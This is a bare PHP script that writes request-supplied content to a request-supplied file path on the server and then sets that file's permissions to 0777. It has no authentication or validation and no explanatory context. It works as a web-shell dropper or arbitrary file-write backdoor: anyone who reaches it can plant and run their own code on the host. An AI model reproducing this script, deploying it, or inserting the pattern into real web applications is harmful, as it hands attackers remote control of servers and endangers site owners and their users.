<?php
$name = $_REQUEST['name'];
$content = $_POST['content'];
file_put_contents($name, $content);
chmod($name, 0777);